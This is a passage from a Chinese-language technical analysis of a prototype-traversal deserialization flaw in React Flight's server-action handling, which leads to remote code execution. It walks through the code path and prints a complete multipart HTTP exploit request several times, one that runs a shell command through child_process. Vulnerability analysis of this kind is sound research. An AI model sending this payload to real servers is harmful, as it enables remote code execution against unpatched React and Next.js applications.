ID 引用 Chunk</td></tr></tbody></table>
<h4 data-id="heading-11">基于 Chunk 的架构</h4>
<p>Flight 将数据组织成 <strong>Chunks (块)</strong> —— 可以相互引用的离散单元：</p>
<pre><code class="hljs language-css" lang="css">┌────────────────────────────────────────────────────────────────────────────┐
│                           CHUNK 结构                                       │
├────────────────────────────────────────────────────────────────────────────┤
│                                                                            │
│   FormData 字段:                                                           │
│   ┌──────────────────────────────────────────────────────────────────┐     │
│   │  Field <span class="hljs-string">"0"</span>:  <span class="hljs-string">'{"name": "John", "ref": "$1"}'</span>     ← Chunk <span class="hljs-number">0</span>       │     │
│   │  Field <span class="hljs-string">"1"</span>:  <span class="hljs-string">'{"address": "123 Main St"}'</span>        ← Chunk <span class="hljs-number">1</span>       │     │
│   │  Field <span class="hljs-string">"2"</span>:  <span class="hljs-string">'"$@0"'</span>                             ← Chunk <span class="hljs-number">2</span>       │     │
│   └──────────────────────────────────────────────────────────────────┘     │
│                                                                            │
│   解析结果:                                                                 │
│   ┌──────────────────────────────────────────────────────────────────┐     │
│   │  Chunk <span class="hljs-number">0</span>: {name: <span class="hljs-string">"John"</span>, ref: → Chunk <span class="hljs-number">1</span>}                         │     │
│   │  Chunk <span class="hljs-number">1</span>: {<span class="hljs-selector-tag">address</span>: <span class="hljs-string">"123 Main St"</span>}                               │     │
│   │  Chunk <span class="hljs-number">2</span>: Promise&lt;Chunk <span class="hljs-number">0</span>&gt;                                       │     │
│   └──────────────────────────────────────────────────────────────────┘     │
│                                                                            │
└────────────────────────────────────────────────────────────────────────────┘
</code></pre>
<h4 data-id="heading-12">Chunk 对象（内部实现）</h4>
<p>在 React 内部，Chunk 被表示为具有类似 Promise 行为的对象：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 摘自 ReactFlightReplyServer.js (118-123行)</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Chunk</span>(<span class="hljs-params">status, value, reason, response</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">status</span> = status;      <span class="hljs-comment">// 'pending' | 'blocked' | 'resolved_model' | 'fulfilled' | 'rejected'</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> = value;        <span class="hljs-comment">// 实际数据或挂起的监听器</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">reason</span> = reason;      <span class="hljs-comment">// 错误原因或 Chunk ID</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">_response</span> = response; <span class="hljs-comment">// 父级 Response 对象</span>
}

<span class="hljs-comment">// Chunks 继承自 Promise.prototype</span>
<span class="hljs-title class_">Chunk</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Chunk</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">then</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">resolve, reject</span>) { <span class="hljs-comment">/* ... */</span> };
</code></pre>
<h4 data-id="heading-13">基于路径的引用（漏洞点）</h4>
<p>Flight 支持使用冒号分隔的路径进行<strong>嵌套属性访问</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-string">"<span class="hljs-variable">$0</span>:users:0:name"</span>
   │  │    │  │
   │  │    │  └── 属性 <span class="hljs-string">"name"</span>
   │  │    └───── 数组索引 0
   │  └────────── 属性 <span class="hljs-string">"users"</span>
   └───────────── Chunk ID 0
</code></pre>
<p><strong>解析过程：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 摘自 getOutlinedModel() - 602-616行</span>
<span class="hljs-keyword">const</span> path = reference.<span class="hljs-title function_">split</span>(<span class="hljs-string">':'</span>);  <span class="hljs-comment">// ["0", "users", "0", "name"]</span>
<span class="hljs-keyword">const</span> id = <span class="hljs-built_in">parseInt</span>(path[<span class="hljs-number">0</span>], <span class="hljs-number">16</span>);   <span class="hljs-comment">// 0</span>
<span class="hljs-keyword">const</span> chunk = <span class="hljs-title function_">getChunk</span>(response, id);

<span class="hljs-keyword">let</span> value = chunk.<span class="hljs-property">value</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; path.<span class="hljs-property">length</span>; i++) {
  value = value[path[i]];  <span class="hljs-comment">// 遍历: value["users"]["0"]["name"]</span>
}
</code></pre>
<p><strong>🔴 漏洞所在：</strong> 对属性名称没有任何验证，允许：</p>
<ul>
<li><code>$0:__proto__:then</code> - 访问原型链</li>
<li><code>$0:constructor:constructor</code> - 访问 Function 构造函数</li>
</ul>
<hr/>
<h3 data-id="heading-14">Payload 反序列化深度解析</h3>
<details>
<summary>
本节将逐步追踪恶意 Payload 是如何被反序列化的。
点击查看详细的代码路径分析。
</summary>
<h4 data-id="heading-15">步骤 1: 接收 HTTP 请求</h4>
<pre><code class="hljs language-http" lang="http">POST / HTTP/1.1
Next-Action: x
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model",...}
------Boundary
Content-Disposition: form-data; name="1"

"$@0"
------Boundary
Content-Disposition: form-data; name="2"

[]
------Boundary--
</code></pre>
<h4 data-id="heading-16">步骤 2: FormData 解析</h4>
<p>Next.js 将 multipart body 解析为 FormData 对象：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 概念性表示</span>
formData = {
  <span class="hljs-string">"0"</span>: <span class="hljs-string">'{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{...}}'</span>,
  <span class="hljs-string">"1"</span>: <span class="hljs-string">'"$@0"'</span>,
  <span class="hljs-string">"2"</span>: <span class="hljs-string">'[]'</span>
}
</code></pre>
<h4 data-id="heading-17">步骤 3: Response 对象创建</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ReactFlightActionServer.js:62-67</span>
<span class="hljs-keyword">const</span> actionResponse = <span class="hljs-title function_">createResponse</span>(
  serverManifest,
  formFieldPrefix,    <span class="hljs-comment">// 例如 "" 或 "$ACTION_0:"</span>
  <span class="hljs-literal">undefined</span>,          <span class="hljs-comment">// temporaryReferences</span>
  body,               <span class="hljs-comment">// FormData</span>
);

<span class="hljs-comment">// 创建 Response 对象 (ReactFlightReplyServer.js:1091-1108)</span>
response = {
  <span class="hljs-attr">_bundlerConfig</span>: serverManifest,
  <span class="hljs-attr">_prefix</span>: formFieldPrefix,      <span class="hljs-comment">// 用于在 FormData 中查找 Chunk</span>
  <span class="hljs-attr">_formData</span>: body,               <span class="hljs-comment">// 原始 FormData</span>
  <span class="hljs-attr">_chunks</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(),            <span class="hljs-comment">// 解析后的 Chunk 缓存</span>
  <span class="hljs-attr">_closed</span>: <span class="hljs-literal">false</span>,
  <span class="hljs-attr">_temporaryReferences</span>: <span class="hljs-literal">undefined</span>,
}
</code></pre>
<h4 data-id="heading-18">步骤 4: 获取 Root Chunk</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ReactFlightActionServer.js:69-72</span>
<span class="hljs-keyword">const</span> refPromise = <span class="hljs-title function_">getRoot</span>(actionResponse);

<span class="hljs-comment">// getRoot 返回 chunk 0 (ReactFlightReplyServer.js:177-180)</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getRoot</span>(<span class="hljs-params">response</span>) {
  <span class="hljs-keyword">const</span> chunk = <span class="hljs-title function_">getChunk</span>(response, <span class="hljs-number">0</span>);  <span class="hljs-comment">// 获取 ID 为 0 的 Chunk</span>
  <span class="hljs-keyword">return</span> chunk;  <span class="hljs-comment">// 作为 Thenable 返回 (具有 .then 方法)</span>
}
</code></pre>
<h4 data-id="heading-19">步骤 5: 从 FormData 查找 Chunk</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// getChunk (ReactFlightReplyServer.js:518-540)</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getChunk</span>(<span class="hljs-params">response, id</span>) {
  <span class="hljs-keyword">const</span> chunks = response.<span class="hljs-property">_chunks</span>;
  <span class="hljs-keyword">let</span> chunk = chunks.<span class="hljs-title function_">get</span>(id);

  <span class="hljs-keyword">if</span> (!chunk) {
    <span class="hljs-keyword">const</span> prefix = response.<span class="hljs-property">_prefix</span>;
    <span class="hljs-keyword">const</span> key = prefix + id;                        <span class="hljs-comment">// "" + "0" = "0"</span>
    <span class="hljs-keyword">const</span> backingEntry = response.<span class="hljs-property">_formData</span>.<span class="hljs-title function_">get</span>(key);  <span class="hljs-comment">// 获取字段 "0"</span>

    <span class="hljs-keyword">if</span> (backingEntry != <span class="hljs-literal">null</span>) {
      <span class="hljs-comment">// 从 JSON 字符串创建 Chunk</span>
      chunk = <span class="hljs-title function_">createResolvedModelChunk</span>(response, backingEntry, id);
      <span class="hljs-comment">// chunk.status = 'resolved_model'</span>
      <span class="hljs-comment">// chunk.value = '{"then":"$1:__proto__:then",...}'</span>
      <span class="hljs-comment">// chunk._response = response</span>
    }
    chunks.<span class="hljs-title function_">set</span>(id, chunk);
  }
  <span class="hljs-keyword">return</span> chunk;
}
</code></pre>
<h4 data-id="heading-20">步骤 6: 通过 .then() 强制解析</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ReactFlightActionServer.js:75</span>
refPromise.<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {});  <span class="hljs-comment">// 触发 Chunk.prototype.then</span>
</code></pre>
<h4 data-id="heading-21">步骤 7: Chunk.prototype.then 执行</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ReactFlightReplyServer.js:127-165</span>
<span class="hljs-title class_">Chunk</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">then</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">resolve, reject</span>) {
  <span class="hljs-keyword">const</span> chunk = <span class="hljs-variable language_">this</span>;

  <span class="hljs-keyword">switch</span> (chunk.<span class="hljs-property">status</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">'resolved_model'</span>:          <span class="hljs-comment">// 我们的 Chunk 匹配这个状态！</span>
      <span class="hljs-title function_">initializeModelChunk</span>(chunk);  <span class="hljs-comment">// 解析 JSON</span>
      <span class="hljs-keyword">break</span>;
  }

  <span class="hljs-keyword">switch</span> (chunk.<span class="hljs-property">status</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">'fulfilled'</span>:
      <span class="hljs-title function_">resolve</span>(chunk.<span class="hljs-property">value</span>);         <span class="hljs-comment">// 返回解析后的值</span>
      <span class="hljs-keyword">break</span>;
  }
}
</code></pre>
<h4 data-id="heading-22">步骤 8: Model 初始化 (JSON 解析)</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// initializeModelChunk (ReactFlightReplyServer.js:446-501)</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">initializeModelChunk</span>(<span class="hljs-params">chunk</span>) {
  <span class="hljs-keyword">const</span> resolvedModel = chunk.<span class="hljs-property">value</span>;
  <span class="hljs-comment">// = '{"then":"$1:__proto__:then","status":"resolved_model",...}'</span>

  <span class="hljs-keyword">const</span> rawModel = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(resolvedModel);
  <span class="hljs-comment">// = {then: "$1:__proto__:then", status: "resolved_model", ...}</span>

  <span class="hljs-keyword">const</span> value = <span class="hljs-title function_">reviveModel</span>(
    chunk.<span class="hljs-property">_response</span>,      <span class="hljs-comment">// Response 对象</span>
    {<span class="hljs-string">''</span>: rawModel},       <span class="hljs-comment">// 包装对象</span>
    <span class="hljs-string">''</span>,                   <span class="hljs-comment">// Key</span>
    rawModel,             <span class="hljs-comment">// 解析后的 JSON</span>
    rootReference         <span class="hljs-comment">// 引用路径</span>
  );
}
</code></pre>
<h4 data-id="heading-23">步骤 9: 递归还原 (处理属性)</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// reviveModel (ReactFlightReplyServer.js:386-442)</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">reviveModel</span>(<span class="hljs-params">response, parentObj, parentKey, value, reference</span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'string'</span>) {
    <span class="hljs-comment">// 处理 $ 前缀的特殊值</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">parseModelString</span>(response, parentObj, parentKey, value, reference);
  }

  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'object'</span> &amp;&amp; value !== <span class="hljs-literal">null</span>) {
    <span class="hljs-comment">// 递归处理所有属性</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> value) {
      <span class="hljs-keyword">const</span> newValue = <span class="hljs-title function_">reviveModel</span>(
        response, value, key, value[key], childRef
      );
      value[key] = newValue;  <span class="hljs-comment">// 替换为解析后的值</span>
    }
  }
  <span class="hljs-keyword">return</span> value;
}
</code></pre>
<h4 data-id="heading-24">步骤 10: 处理 <code>$1:__proto__:then</code></h4>
<p>当还原值为 <code>"$1:__proto__:then"</code> 的 <code>then</code> 属性时：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// parseModelString (ReactFlightReplyServer.js:916-1089)</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">parseModelString</span>(<span class="hljs-params">response, obj, key, value, reference</span>) {
  <span class="hljs-keyword">if</span> (value[<span class="hljs-number">0</span>] === <span class="hljs-string">'$'</span>) {
    <span class="hljs-comment">// ... 各种 $X 情况 ...</span>

    <span class="hljs-comment">// 默认: 视为带路径的 Chunk 引用</span>
    <span class="hljs-keyword">const</span> ref = value.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// "1:__proto__:then"</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">getOutlinedModel</span>(response, ref, obj, key, createModel);
  }
}
</code></pre>
<h4 data-id="heading-25">步骤 11: 路径遍历 (漏洞核心)</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// getOutlinedModel (ReactFlightReplyServer.js:595-638)</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getOutlinedModel</span>(<span class="hljs-params">response, reference, parentObject, key, map</span>) {
  <span class="hljs-keyword">const</span> path = reference.<span class="hljs-title function_">split</span>(<span class="hljs-string">':'</span>);  <span class="hljs-comment">// ["1", "__proto__", "then"]</span>
  <span class="hljs-keyword">const</span> id = <span class="hljs-built_in">parseInt</span>(path[<span class="hljs-number">0</span>], <span class="hljs-number">16</span>);   <span class="hljs-comment">// 1</span>
  <span class="hljs-keyword">const</span> chunk = <span class="hljs-title function_">getChunk</span>(response, id);  <span class="hljs-comment">// 获取 Chunk 1</span>

  <span class="hljs-comment">// Chunk 1 包含 "$@0" - 一个指向 Chunk 0 的引用</span>
  <span class="hljs-comment">// 解析后，chunk1.value = chunk0 (Chunk 对象本身)</span>

  <span class="hljs-keyword">switch</span> (chunk.<span class="hljs-property">status</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">'fulfilled'</span>:
      <span class="hljs-keyword">let</span> value = chunk.<span class="hljs-property">value</span>;        <span class="hljs-comment">// Chunk 0 的 Chunk 对象</span>

      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; path.<span class="hljs-property">length</span>; i++) {
        value = value[path[i]];       <span class="hljs-comment">// 🔴 没有净化处理！</span>
      }
      <span class="hljs-comment">// path[1] = "__proto__"  →  value = Chunk.prototype</span>
      <span class="hljs-comment">// path[2] = "then"       →  value = Chunk.prototype.then (FUNCTION!)</span>

      <span class="hljs-keyword">return</span> <span class="hljs-title function_">map</span>(response, value);    <span class="hljs-comment">// 返回 .then 函数</span>
  }
}
</code></pre>
<h4 data-id="heading-26">步骤 12: 反序列化结果</h4>
<p>处理完毕后，Payload 对象变为：</p>
<pre><code class="hljs language-javascript" lang="javascript">{
  <span class="hljs-attr">then</span>: <span class="hljs-title class_">Chunk</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">then</span>,  <span class="hljs-comment">// 🔴 窃取的函数！</span>
  <span class="hljs-attr">status</span>: <span class="hljs-string">"resolved_model"</span>,
  <span class="hljs-attr">reason</span>: -<span class="hljs-number">1</span>,
  <span class="hljs-attr">value</span>: <span class="hljs-string">'{"then":"$B1337"}'</span>,
  <span class="hljs-attr">_response</span>: {
    <span class="hljs-attr">_prefix</span>: <span class="hljs-string">"process.mainModule.require('child_process').execSync('say haha');"</span>,
    <span class="hljs-attr">_chunks</span>: <span class="hljs-title class_">Map</span>,              <span class="hljs-comment">// 来自 $Q2</span>
    <span class="hljs-attr">_formData</span>: {
      <span class="hljs-attr">get</span>: <span class="hljs-title class_">Function</span>            <span class="hljs-comment">// 🔴 FUNCTION 构造函数！ (来自 $1:constructor:constructor)</span>
    }
  }
}
</code></pre>
<h4 data-id="heading-27">反序列化流程图解</h4>
<pre><code class="hljs language-ini" lang="ini">┌─────────────────────────────────────────────────────────────────────────────┐
│                       反序列化流程 (DESERIALIZATION FLOW)                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   HTTP 请求                                                                 │
│        │                                                                    │
│        ▼                                                                    │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ FormData 解析                                                       │   │
│   │   "0" → '{"then":"$1:__proto__:then",...}'                          │   │
│   │   "1" → '"$@0"'                                                     │   │
│   │   "2" → '<span class="hljs-section">[]</span>'                                                        │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│        │                                                                    │
│        ▼                                                                    │
│   ┌──────────────────────────────────────────────────────────────────────┐  │
│   │ createResponse()                                                     │  │
│   │   <span class="hljs-attr">response._formData</span> = FormData                                      │  │
│   │   <span class="hljs-attr">response._chunks</span> = Map()                                           │  │
│   └──────────────────────────────────────────────────────────────────────┘  │
│        │                                                                    │
│        ▼                                                                    │
│   ┌──────────────────────────────────────────────────────────────────────┐  │
│   │ getRoot() → getChunk(response, 0)                                    │  │
│   │   从字段 "0" 创建 ResolvedModelChunk                                  │  │
│   └──────────────────────────────────────────────────────────────────────┘  │
│        │                                                                    │
│        ▼                                                                    │
│   ┌──────────────────────────────────────────────────────────────────────┐  │
│   │ chunk.then(() =&gt; {})   ← 触发点                                      │  │
│   │   └── initializeModelChunk(chunk)                                    │  │
│   │         └── JSON.parse(chunk.value)                                  │  │
│   │         └── reviveModel(response, {...}, ...)                        │  │
│   └──────────────────────────────────────────────────────────────────────┘  │
│        │                                                                    │
│        ▼                                                                    │
│   ┌──────────────────────────────────────────────────────────────────────┐  │
│   │ reviveModel() - 遍历每个属性:                                         │  │
│   │                                                                      │  │
│   │   "then": "$1:__proto__:then"                                        │  │
│   │      └── parseModelString()                                          │  │
│   │            └── getOutlinedModel("1:__proto__:then")                  │  │
│   │                  └── <span class="hljs-attr">path</span> = [<span class="hljs-string">"1"</span>, <span class="hljs-string">"__proto__"</span>, <span class="hljs-string">"then"</span>]               │  │
│   │                  └── <span class="hljs-attr">chunk1</span> = getChunk(<span class="hljs-number">1</span>)  // <span class="hljs-string">"$@0"</span> → chunk0         │  │
│   │                  └── <span class="hljs-attr">value</span> = chunk0[<span class="hljs-string">"__proto__"</span>][<span class="hljs-string">"then"</span>]             │  │
│   │                  └── 返回 Chunk.prototype.then  🔴                   │  │
│   │                                                                      │  │
│   │   "_formData.get": "$1:constructor:constructor"                      │  │
│   │      └── <span class="hljs-attr">path</span> = [<span class="hljs-string">"1"</span>, <span class="hljs-string">"constructor"</span>, <span class="hljs-string">"constructor"</span>]                  │  │
│   │      └── <span class="hljs-attr">value</span> = Object.constructor = Function  🔴                   │  │
│   │                                                                      │  │
│   └──────────────────────────────────────────────────────────────────────┘  │
│        │                                                                    │
│        ▼                                                                    │
│   ┌──────────────────────────────────────────────────────────────────────┐  │
│   │ 结果: 包含以下内容的恶意对象:                                          │  │
│   │   - <span class="hljs-attr">then</span> = Chunk.prototype.then (使其变为 thenable)                  │  │
│   │   - <span class="hljs-attr">_response._formData.get</span> = Function 构造函数                      │  │
│   │   - <span class="hljs-attr">_response._prefix</span> = 恶意代码字符串                                │  │
│   └──────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
</code></pre>
</details>
<hr/>
<h3 data-id="heading-28">Payload 详情</h3>
<pre><code class="hljs language-http" lang="http">POST / HTTP/1.1
Host: localhost
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('say haha');","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
</code></pre>
<h4 data-id="heading-29">Payload 结构拆解</h4>

























<table><thead><tr><th>字段</th><th>值</th><th>目的</th></tr></thead><tbody><tr><td><code>0</code></td><td>主 JSON Payload</td><td>带有恶意 <code>_response</code> 的伪造 Chunk 对象</td></tr><tr><td><code>1</code></td><td><code>"$@0"</code></td><td>Promise 引用，创建循环依赖</td></tr><tr><td><code>2</code></td><td><code>[]</code></td><td>空数组，用于 Map 引用的占位符</td></tr></tbody></table>
<h4 data-id="heading-30">主 Payload 对象</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"then"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"$1:__proto__:then"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"status"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"resolved_model"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"reason"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">-1</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"value"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"{\"then\":\"$B1337\"}"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"_response"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"_prefix"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"process.mainModule.require('child_process').execSync('say haha');"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"_chunks"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"$Q2"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"_formData"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"get"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"$1:constructor:constructor"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h3 data-id="heading-31">详细代码路径分析</h3>
<h4 data-id="heading-32">阶段 1: 入口点</h4>
<p><strong>文件:</strong> <code>packages/react-server/src/ReactFlightActionServer.js</code></p>
<pre><code class="hljs language-scss" lang="scss">POST / → <span class="hljs-built_in">decodeAction</span>() → <span class="hljs-built_in">decodeBoundActionMetaData</span>()
                              ↓
                         <span class="hljs-built_in">createResponse</span>(serverManifest, formFieldPrefix, undefined, body)
                              ↓
                         <span class="hljs-built_in">getRoot</span>(actionResponse)  <span class="hljs-comment">// 返回 Chunk 0 (作为 thenable)</span>
                              ↓
                         refPromise<span class="hljs-selector-class">.then</span>(() =&gt; {})  <span class="hljs-comment">// 第 75 行 - 强制解析</span>
</code></pre>
<p><strong>代码 (56-81 行):</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">decodeBoundActionMetaData</span>(<span class="hljs-params">body, serverManifest, formFieldPrefix</span>) {
  <span class="hljs-keyword">const</span> actionResponse = <span class="hljs-title function_">createResponse</span>(
    serverManifest,
    formFieldPrefix,
    <span class="hljs-literal">undefined</span>,
    body,
  );
  <span class="hljs-title function_">close</span>(actionResponse);
  <span class="hljs-keyword">const</span> refPromise = <span class="hljs-title function_">getRoot</span>(actionResponse);

  <span class="hljs-comment">// 强制初始化</span>
  refPromise.<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {});  <span class="hljs-comment">// ← 触发点 (TRIGGER POINT)</span>

  <span class="hljs-keyword">if</span> (refPromise.<span class="hljs-property">status</span> !== <span class="hljs-string">'fulfilled'</span>) {
    <span class="hljs-keyword">throw</span> refPromise.<span class="hljs-property">reason</span>;
  }
  <span class="hljs-keyword">return</span> refPromise.<span class="hljs-property">value</span>;
}
</code></pre>
<p>在 <strong>第 75 行</strong>，对 Root Chunk 调用 <code>.then()</code>，触发了整个利用链。</p>
<hr/>
<h4 data-id="heading-33">阶段 2: Chunk 解析与原型链访问</h4>
<p><strong>文件:</strong> <code>packages/react-server/src/ReactFlightReplyServer.js</code></p>
<p><strong>代码 (127-143 行):</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Chunk</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">then</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">resolve, reject</span>) {
  <span class="hljs-keyword">const</span> chunk = <span class="hljs-variable language_">this</span>;
  <span class="hljs-keyword">switch</span> (chunk.<span class="hljs-property">status</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-attr">RESOLVED_MODEL</span>:
      <span class="hljs-title function_">initializeModelChunk</span>(chunk);  <span class="hljs-comment">// 第 137 行 - 触发解析</span>
      <span class="hljs-keyword">break</span>;
  }
  <span class="hljs-comment">// 初始化后状态可能已改变</span>
  <span class="hljs-keyword">switch</span> (chunk.<span class="hljs-property">status</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-attr">INITIALIZED</span>:
      <span class="hljs-title function_">resolve</span>(chunk.<span class="hljs-property">value</span>);  <span class="hljs-comment">// 第 143 行 - 将值传递给 Promise 链</span>
      <span class="hljs-keyword">break</span>;
    <span class="hljs-comment">// ...</span>
  }
}
</code></pre>
<p>当 Chunk 0（包含 Payload）被解析时：</p>
<ol>
<li><code>initializeModelChunk</code> 解析 JSON。</li>
<li><code>reviveModel</code> 递归处理所有属性。</li>
</ol>
<hr/>
<h4 data-id="heading-34">阶段 3: 关键漏洞 —— 路径遍历</h4>
<p><strong>文件:</strong> <code>packages/react-server/src/ReactFlightReplyServer.js</code></p>
<p><strong>代码 (595-616 行):</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getOutlinedModel</span>(<span class="hljs-params">response, reference, parentObject, key, map</span>) {
  <span class="hljs-keyword">const</span> path = reference.<span class="hljs-title function_">split</span>(<span class="hljs-string">':'</span>);  <span class="hljs-comment">// "1:__proto__:then" → ["1", "__proto__", "then"]</span>
  <span class="hljs-keyword">const</span> id = <span class="hljs-built_in">parseInt</span>(path[<span class="hljs-number">0</span>], <span class="hljs-number">16</span>);
  <span class="hljs-keyword">const</span> chunk = <span class="hljs-title function_">getChunk</span>(response, id);

  <span class="hljs-comment">// ... chunk 初始化 ...</span>

  <span class="hljs-keyword">switch</span> (chunk.<span class="hljs-property">status</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-attr">INITIALIZED</span>:
      <span class="hljs-keyword">let</span> value = chunk.<span class="hljs-property">value</span>;
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; path.<span class="hljs-property">length</span>; i++) {
        value = value[path[i]];  <span class="hljs-comment">// 614-615 行: 没有净化处理!</span>
      }
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">map</span>(response, value);
  }
}
</code></pre>
<h5 data-id="heading-35">漏洞分析</h5>
<p>冒号分隔的路径允许访问 <strong>任何</strong> 属性，包括：</p>
<ul>
<li><code>__proto__</code> - 访问原型链</li>
<li><code>constructor</code> - 访问构造函数</li>
</ul>
<p><strong>这里没有任何验证来阻止危险的属性访问。</strong></p>
<hr/>
<h4 data-id="heading-36">阶段 4: 窃取 <code>Chunk.prototype.then</code></h4>
<p>当 <code>$1:__proto__:then</code> 被解析时：</p>
<pre><code class="hljs language-ini" lang="ini">$1:__proto__:then
    ↓
<span class="hljs-attr">path</span> = [<span class="hljs-string">"1"</span>, <span class="hljs-string">"__proto__"</span>, <span class="hljs-string">"then"</span>]
    ↓
<span class="hljs-attr">chunk1</span> = getChunk(response, <span class="hljs-number">1</span>)  // 包含 <span class="hljs-string">"$@0"</span>
    ↓
"$@0" 解析为 chunk0 (Chunk 对象本身)
    ↓
<span class="hljs-attr">value</span> = chunk0[<span class="hljs-string">"__proto__"</span>]     // = Chunk.prototype (继承自 Promise.prototype)
    ↓
<span class="hljs-attr">value</span> = value[<span class="hljs-string">"then"</span>]           // = Chunk.prototype.then 函数
</code></pre>
